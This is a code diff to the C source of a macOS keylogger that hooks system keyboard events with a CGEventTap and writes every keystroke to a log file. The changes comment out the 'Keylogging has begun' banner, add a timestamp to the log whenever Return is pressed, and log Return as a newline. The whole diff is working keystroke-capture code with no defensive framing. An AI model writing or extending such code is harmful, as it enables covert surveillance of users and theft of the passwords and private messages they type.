@@ -44,8 +44,8 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
-    fflush(logfile);
+    //fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    //fflush(logfile);
 
     // Display the location of the logfile and start the loop.
     printf("Logging to: %s\n", logfileLocation);
@@ -105,6 +105,13 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Print the human readable key to the logfile.
     bool shift = flags & kCGEventFlagMaskShift;
     bool caps = flags & kCGEventFlagMaskAlphaShift;
+    if ((int) keyCode == 36) {
+	time_t result = time(NULL);
+        struct tm *timeinfo = localtime(&result);
+        char buffer[256];
+        strftime(buffer, sizeof(buffer), "%Y-%m-%dT%H:%M:%S%z", timeinfo);
+    	fprintf(logfile, "\n#%s", buffer);
+	}
     fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
     fflush(logfile);
     return event;
@@ -179,7 +186,7 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
         case 89:  return "7";
         case 91:  return "8";
         case 92:  return "9";
-        case 36:  return "[return]";
+        case 36:  return "\n";
         case 48:  return "[tab]";
         case 49:  return " ";
         case 51:  return "[del]";
